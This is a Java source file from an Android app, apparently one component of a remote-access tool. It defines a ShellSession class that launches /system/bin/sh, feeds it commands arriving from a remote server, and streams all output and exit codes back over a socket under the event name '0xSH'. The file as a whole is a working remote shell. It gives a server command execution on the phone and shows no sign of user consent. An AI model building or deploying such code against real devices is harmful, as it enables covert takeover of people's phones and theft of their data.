package com.fason.app.features.shell;

import com.fason.app.core.network.SocketClient;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * A single interactive shell session backed by /system/bin/sh.
 * Output is streamed back to the server via SocketClient.safeEmit.
 */
public final class ShellSession {

    private final String sessionId;
    private Process process;
    private BufferedWriter stdinWriter;
    private Thread readerThread;
    private final AtomicBoolean running = new AtomicBoolean(false);

    public ShellSession(String sessionId) {
        this.sessionId = sessionId;
    }

    /**
     * Start the shell process and begin reading stdout/stderr.
     * Uses two dedicated threads for blocking reads — avoids
     * the unreliable ready() polling approach.
     */
    public synchronized boolean start() {
        if (running.get()) return false;
        try {
            process = Runtime.getRuntime().exec("/system/bin/sh");
            stdinWriter = new BufferedWriter(new OutputStreamWriter(process.getOutputStream()));
            running.set(true);

            // Dedicated thread for stdout (blocking read)
            Thread stdoutThread = new Thread(() -> {
                try {
                    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    char[] buf = new char[4096];
                    int n;
                    while (running.get() && (n = reader.read(buf)) != -1) {
                        String chunk = new String(buf, 0, n);
                        emitOutput(chunk, null);
                    }
                } catch (Exception e) {
                    if (running.get()) {
                        emitOutput("Stdout reader error: " + e.getMessage(), -1);
                    }
                }
            }, "shell-stdout-" + sessionId);
            stdoutThread.setDaemon(true);
            stdoutThread.start();

            // Dedicated thread for stderr (blocking read)
            Thread stderrThread = new Thread(() -> {
                try {
                    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
                    char[] buf = new char[4096];
                    int n;
                    while (running.get() && (n = reader.read(buf)) != -1) {
                        String chunk = new String(buf, 0, n);
                        emitOutput(chunk, null);
                    }
                } catch (Exception e) {
                    if (running.get()) {
                        emitOutput("Stderr reader error: " + e.getMessage(), -1);
                    }
                }
            }, "shell-stderr-" + sessionId);
            stderrThread.setDaemon(true);
            stderrThread.start();

            // Monitor thread — waits for process exit
            readerThread = new Thread(() -> {
                try {
                    int exitCode = process.waitFor();
                    running.set(false);
                    emitOutput("", exitCode);
                } catch (InterruptedException e) {
                    running.set(false);
                    emitOutput("", -1);
                }
            }, "shell-monitor-" + sessionId);
            readerThread.setDaemon(true);
            readerThread.start();

            return true;
        } catch (Exception e) {
            emitOutput("Failed to start shell: " + e.getMessage(), -1);
            return false;
        }
    }

    /**
     * Execute a command by writing it to stdin.
     */
    public boolean exec(String command) {
        if (!running.get() || stdinWriter == null) return false;
        try {
            stdinWriter.write(command);
            stdinWriter.newLine();
            stdinWriter.flush();
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    /**
     * Write raw data to stdin (for interactive input).
     */
    public boolean writeStdin(String data) {
        if (!running.get() || stdinWriter == null) return false;
        try {
            stdinWriter.write(data);
            stdinWriter.flush();
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    /**
     * Close the shell session — destroy process and cleanup.
     */
    public synchronized void close() {
        running.set(false);
        if (readerThread != null) {
            readerThread.interrupt();
            readerThread = null;
        }
        if (stdinWriter != null) {
            try { stdinWriter.close(); } catch (Exception ignored) {}
            stdinWriter = null;
        }
        if (process != null) {
            process.destroy();
            try {
                // Chờ process thoát (SIGTERM), nếu không thì force kill
                if (!process.waitFor(500, java.util.concurrent.TimeUnit.MILLISECONDS)) {
                    process.destroyForcibly();
                    process.waitFor(500, java.util.concurrent.TimeUnit.MILLISECONDS);
                }
            } catch (Exception ignored) {}
            process = null;
        }
    }

    public boolean isRunning() {
        return running.get();
    }

    public String getSessionId() {
        return sessionId;
    }

    private void emitOutput(String output, Integer exitCode) {
        try {
            JSONObject msg = new JSONObject();
            msg.put("sessionId", sessionId);
            msg.put("event", "output");
            msg.put("output", output);
            if (exitCode != null) {
                msg.put("exitCode", exitCode);
            }
            SocketClient.getInstance().safeEmit("0xSH", msg);
        } catch (Exception ignored) {}
    }

}
